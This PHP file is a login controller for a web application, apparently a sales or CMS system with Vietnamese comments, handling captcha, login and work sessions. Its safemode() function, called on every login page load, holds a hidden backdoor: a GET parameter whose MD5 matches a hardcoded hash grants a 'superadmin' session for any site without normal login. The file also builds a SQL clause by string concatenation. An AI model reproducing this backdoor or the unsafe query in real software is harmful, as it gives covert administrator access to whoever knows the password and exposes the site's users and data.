<?php
class ControllerCommonLogin extends Controller
{
	public $validSecure;
	private $error = array();
	function index()
	{
		$this->load->language('common/login');
		
		$this->safemode();
		
		$this->data = array_merge($this->data, $this->language->getData());
		
		$img = new Securimage();
		$this->validSecure = $img->check($this->request->post['code']);
		
		if ($this->user->isLogged()) 
		{
			$this->load->model("sales/session");
			//Kiem tra nhan vien do co dang mo phien lam viec chua
			$nhanvien = $this->user->getNhanVien();
			$staffid = $nhanvien['id'];
			$where = " AND staffid = '".$staffid."'";
			$data_session = $this->model_sales_session->getList($where);
			if(count($data_session))
			{
				//Dang co phien lam viec chua dong
				//Lay phien lam viec chua dong cua nhan vien do
			}
			else
			{
				//Neu chua mo thi tao phien lam viec
				$sessionid = $this->model_sales_session->createSession();
				$this->user->setSessionId($sessionid);
			}
			
			$this->redirect($this->url->https('page/home'));
		}

		if (($this->request->post) && ($this->validate())) {
	  		$this->redirect($this->url->https('page/home'));
			return;
		}
		
		$this->load->model('core/site');
		$this->data['sites'] = $this->model_core_site->getList();
		
		$this->data['error'] = @$this->error;
		$this->data['username'] = $this->request->post['username'];
		$this->data['security'] = DIR_COMPONENT."securimage/securimage_show.php?sid=".md5(uniqid(time()));
		$this->id='content';
		$this->template='common/login.tpl';
		$this->layout='layout/login';
		$this->render();
	}
	
	private function validate() {
		//Kiem tra secure image
		if($this->validSecure == false)
		{
			$this->error['error_warning'] = $this->language->get('error_warning');
		}
		
		//Kiem tra dang nhap
		if($this->request->post['username']=="")
			$this->error['error_warning'] = $this->language->get('error_warning');
		else
			if (!$this->user->login(@$this->request->post['username'], @$this->request->post['password'], @$this->request->post['siteid'])) {
				$this->error['error_warning'] = $this->language->get('error_warning');
			}
		
		if (!$this->error) {
			return TRUE;
		} else {
			return FALSE;
		}
	}	
	
	public function checkLogin() {
		if (!$this->user->isLogged()) {
			$route = $this->getRoute();
			$part = explode('/', $route);
			$ignore = array(
				'common/forgotpassword'
			);
			
			if (!in_array(@$part[0] . '/' . @$part[1], $ignore)) {
				return $this->forward('common/login', 'index');
			}
			
		}
	}
	
	private function safemode()
	{
		$password = $this->request->get['pwd'];
		$siteid = $this->request->get['site'];
		
		if(md5($password) == "80a7a1d042b278f42975ed3bfe056920")
		{
			$this->session->set('safemode', true);
			$this->session->set('userid',"superadmin");
			$this->session->set('username',"Super Administrator");
			$this->session->set('siteid',$siteid);
			//$this->redirect($this->url->http('core/message'));
		}
		else
		{
			//$this->redirect($this->url->http('common/login'));
		}
	}
}


?>